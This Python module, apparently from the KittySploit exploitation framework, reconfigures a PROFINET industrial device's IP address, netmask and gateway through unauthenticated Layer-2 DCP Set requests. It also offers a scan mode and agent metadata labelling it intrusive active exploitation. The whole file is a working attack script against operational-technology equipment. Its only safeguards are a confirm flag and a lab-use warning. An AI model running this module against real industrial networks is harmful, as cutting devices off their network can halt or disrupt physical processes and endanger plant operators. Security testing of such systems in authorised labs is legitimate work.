#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PROFINET DCP device IP configuration.

Uses Layer-2 PROFINET DCP Set requests to reconfigure a target device's IP address,
subnet mask, and gateway without authentication.
"""

from __future__ import annotations

from kittysploit import *
from lib.protocols.ics.profinet_dcp import (
    dcp_identify_mac,
    dcp_set_ip,
    device_table_rows,
    normalize_mac,
)


TABLE_HEADER = [
    "Device Name",
    "Device Type",
    "MAC Address",
    "IP Address",
    "Netmask",
    "Gateway",
]


class Module(Auxiliary):
    __info__ = {
        "name": "PROFINET DCP device IP setup",
        "description": (
            "Reconfigures a PROFINET device's IP address, subnet mask, and gateway "
            "via unauthenticated Layer-2 DCP Set requests on an Ethernet interface."
        ),
        "author": ["wenzhe zhu", "KittySploit Team"],
        "platform": Platform.OTHER,
        "tags": ["ics", "siemens", "profinet", "dcp", "layer2", "ot", "config"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["endpoints", "risk_signals"],
            "chain": {
                "requires_ot_context": True,
            },
        },
    }

    interface = OptString("eth0", "Ethernet interface for DCP traffic", True)
    target = OptString("", "Target device MAC address", True)
    target_ip = OptString("192.168.1.100", "IP address to set", True)
    target_netmask = OptString("255.255.255.0", "Subnet mask to set", True)
    target_gateway = OptString("0.0.0.0", "Default gateway to set", False)
    timeout = OptFloat(3.0, "Seconds to wait for DCP responses", False)
    verbose = OptInteger(0, "Scapy verbosity level (0-2)", False, advanced=True)
    action = OptChoice("set", "Operation mode", False, choices=["scan", "set"])
    confirm = OptBool(False, "Confirm intentional IP reconfiguration", True)

    def _dcp_error(self, exc: Exception) -> bool:
        if isinstance(exc, ValueError):
            print_error(str(exc))
            return False
        if isinstance(exc, RuntimeError):
            print_error(str(exc))
            return False
        if isinstance(exc, PermissionError):
            print_error(
                f"Permission denied on {self.interface} — run as root or grant CAP_NET_RAW"
            )
            return False
        print_error(f"PROFINET DCP failed: {exc}")
        return False

    def _print_devices(self, devices) -> None:
        rows = device_table_rows(devices)
        if rows:
            print_table(TABLE_HEADER, rows)
        else:
            print_warning("No PROFINET DCP responses received")

    def _scan_target(self, target_mac: str):
        iface = str(self.interface or "").strip()
        return dcp_identify_mac(
            iface,
            target_mac,
            float(self.timeout or 3.0),
            verbose=int(self.verbose or 0),
        )

    def check(self):
        iface = str(self.interface or "").strip()
        target_mac = str(self.target or "").strip()
        if not iface or not target_mac:
            return {"vulnerable": False, "reason": "interface and target MAC required", "confidence": "low"}
        try:
            normalize_mac(target_mac)
        except ValueError as exc:
            return {"vulnerable": False, "reason": str(exc), "confidence": "high"}
        if str(self.action or "set").lower() == "set" and not bool(self.confirm):
            return {
                "vulnerable": False,
                "reason": "set confirm=true to acknowledge IP reconfiguration",
                "confidence": "high",
            }
        try:
            devices = self._scan_target(target_mac)
        except (RuntimeError, PermissionError, OSError, ValueError) as exc:
            return {"vulnerable": False, "reason": str(exc), "confidence": "medium"}
        if devices:
            return {
                "vulnerable": True,
                "reason": "target responded to PROFINET DCP Identify",
                "confidence": "medium",
            }
        return {
            "vulnerable": False,
            "reason": "target did not respond to DCP Identify",
            "confidence": "medium",
        }

    def run(self):
        iface = str(self.interface or "").strip()
        target_mac = str(self.target or "").strip()
        if not iface:
            print_error("Interface is required")
            return False
        if not target_mac:
            print_error("Target MAC is required")
            return False

        try:
            target_mac = normalize_mac(target_mac)
        except ValueError as exc:
            print_error(str(exc))
            return False

        if str(self.action or "set").lower() == "scan":
            print_status(f"Identifying PROFINET device {target_mac} on {iface}...")
            try:
                devices = self._scan_target(target_mac)
            except (RuntimeError, PermissionError, OSError, ValueError) as exc:
                return self._dcp_error(exc)
            self._print_devices(devices)
            return bool(devices)

        if not bool(self.confirm):
            print_error("Refusing to change device IP without confirm=true")
            return False

        ip_address = str(self.target_ip or "").strip()
        subnet_mask = str(self.target_netmask or "").strip()
        gateway = str(self.target_gateway or "0.0.0.0").strip()

        print_warning("DCP IP reconfiguration is disruptive — authorized OT lab use only")
        print_status(f"Reading current configuration for {target_mac}...")
        try:
            before = self._scan_target(target_mac)
        except (RuntimeError, PermissionError, OSError, ValueError) as exc:
            return self._dcp_error(exc)

        if not before:
            print_error("Target device did not respond — check MAC address and interface")
            return False

        self._print_devices(before)
        print_status(
            f"Applying IP={ip_address} netmask={subnet_mask} gateway={gateway} to {target_mac}"
        )

        try:
            dcp_set_ip(
                iface,
                target_mac,
                ip_address,
                subnet_mask,
                gateway,
                verbose=int(self.verbose or 0),
            )
        except (RuntimeError, PermissionError, OSError, ValueError) as exc:
            return self._dcp_error(exc)

        print_status("Verifying new configuration...")
        try:
            after = self._scan_target(target_mac)
        except (RuntimeError, PermissionError, OSError, ValueError) as exc:
            return self._dcp_error(exc)

        if not after:
            print_error("Setup target IP failed — no DCP response after Set")
            return False

        self._print_devices(after)
        applied = after[0]
        if (
            applied.ip_address != ip_address
            or applied.subnet_mask != subnet_mask
            or applied.gateway != gateway
        ):
            print_error("Setup target IP failed — reported values do not match requested config")
            return False

        print_success("PROFINET DCP IP configuration applied successfully")
        return True
